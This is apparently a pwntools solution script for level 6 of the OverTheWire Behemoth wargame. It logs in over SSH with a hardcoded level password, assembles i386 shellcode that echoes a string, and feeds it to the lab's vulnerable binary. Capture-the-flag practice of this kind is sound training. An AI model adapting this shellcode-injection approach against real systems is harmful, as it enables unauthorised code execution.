from pwn import *


con = ssh('behemoth6', 'behemoth.labs.overthewire.org', password='mayiroeche', port=2221)
context.arch = 'i386'
shellcode = shellcraft.linux.echo('HelloKitty', 1)
p = con.process('sh')
p.sendline('cd /tmp && cd /tmp/behem6')
p.sendline(b'echo "' + asm(shellcode) + b'" > shellcode.txt')
p.sendline('/behemoth/behemoth6')
print(p.recv())
print(p.recv())
print(p.recv())
print(p.recv())
